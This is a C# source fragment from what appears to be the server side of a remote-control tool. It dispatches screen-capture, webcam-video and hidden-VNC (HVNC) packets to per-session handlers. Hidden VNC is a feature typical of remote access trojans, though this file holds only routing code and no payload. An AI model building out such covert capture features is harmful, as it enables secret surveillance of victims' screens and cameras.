using System;
using System.Collections.Generic;
using System.ComponentModel;
using System.Drawing;
using System.Linq;
using System.Text;
using System.Windows.Forms;
using System.Net.Sockets;
using RemoteControl.Protocals;
using System.IO;
using System.Threading;
using System.Diagnostics;
using System.Runtime.InteropServices;
using log4net;
using RemoteControl.Protocals.Plugin;
using RemoteControl.Protocals.Request;
using RemoteControl.Protocals.Response;
using RemoteControl.Audio;
using RemoteControl.Audio.Codecs;
using RemoteControl.Protocals.Utilities;
using RemoteControl.Protocals.Relay;
using RemoteControl.Server.Utils;
namespace RemoteControl.Server
{
    public partial class FrmMain
    {
        private void HandleCapturePackets(PacketReceivedEventArgs e)
        {
            if (e.PacketType == ePacketType.PACKET_START_CAPTURE_SCREEN_RESPONSE)
            {
                if (sessionScreenHandlers.ContainsKey(e.Session.SocketId))
                {
                    var screenHandle = sessionScreenHandlers[e.Session.SocketId];
                    screenHandle(e.Obj as ResponseStartGetScreen);
                }
            }
            else if (e.PacketType == ePacketType.PACKET_HVNC_SCREEN_RESPONSE)
            {
                if (sessionHVNCScreenHandlers.ContainsKey(e.Session.SocketId))
                {
                    var screenHandle = sessionHVNCScreenHandlers[e.Session.SocketId];
                    screenHandle(e.Obj as ResponseHVNCScreen);
                }
            }
            else if (e.PacketType == ePacketType.PACKET_HVNC_START_RESPONSE)
            {
                if (sessionHVNCStartHandlers.ContainsKey(e.Session.SocketId))
                {
                    var startHandle = sessionHVNCStartHandlers[e.Session.SocketId];
                    startHandle(e.Obj as ResponseHVNCStart);
                }
            }
            else if (e.PacketType == ePacketType.PACKET_START_CAPTURE_VIDEO_RESPONSE)
            {
                if (sessionVideoHandlers.ContainsKey(e.Session.SocketId))
                {
                    var videoHandle = sessionVideoHandlers[e.Session.SocketId];
                    videoHandle(e.Obj as ResponseStartCaptureVideo);
                }
            }
        }
    }
}
